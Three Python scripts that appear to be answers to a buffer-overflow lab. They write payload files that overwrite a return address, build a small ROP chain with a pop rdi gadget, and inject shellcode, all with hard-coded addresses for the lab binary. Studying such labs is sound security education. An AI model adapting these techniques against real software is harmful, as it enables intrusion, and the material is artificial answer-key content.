

padding = b"A" * 16

func1_address = b"\x16\x12\x40\x00\x00\x00\x00\x00"

payload = padding + func1_address

with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Payload generated in ans1.txt")
padding = b"A" * 16

pop_rdi = b"\xc7\x12\x40\x00\x00\x00\x00\x00" 

arg1 = b"\xf8\x03\x00\x00\x00\x00\x00\x00"

func2_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"

payload = padding + pop_rdi + arg1 + func2_addr

with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Payload for Problem2 written to ans2.txt")
import struct

shellcode = b"\xbf\x72\x00\x00\x00\x48\xc7\xc0\x16\x12\x40\x00\xff\xd0"

padding = shellcode + b"A" * (40 - len(shellcode))

return_addr = struct.pack("<Q", 0x401334)

payload = padding + return_addr

with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"Shellcode payload generated. Length: {len(payload)} bytes")